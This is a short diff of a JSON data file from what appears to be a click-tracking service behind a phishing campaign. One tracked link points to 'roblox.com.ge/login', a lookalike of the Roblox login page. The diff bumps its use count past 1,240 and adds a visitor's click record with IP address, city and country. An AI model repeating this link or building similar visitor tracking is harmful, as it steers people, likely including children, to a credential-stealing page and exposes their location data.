@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1240,
+    "useCount": 1241,
     "createdBy": "admin",
     "clicks": [
       {
@@ -10059,6 +10059,14 @@
       },
       {
         "timestamp": 1777337745016,
+        "ip": "76.145.32.207",
+        "country": "United States",
+        "city": "Lithonia",
+        "flag": "🇺🇸",
+        "countryCode": "US"
+      },
+      {
+        "timestamp": 1777337993884,
         "ip": "76.145.32.207",
         "country": "United States",
         "city": "Lithonia",
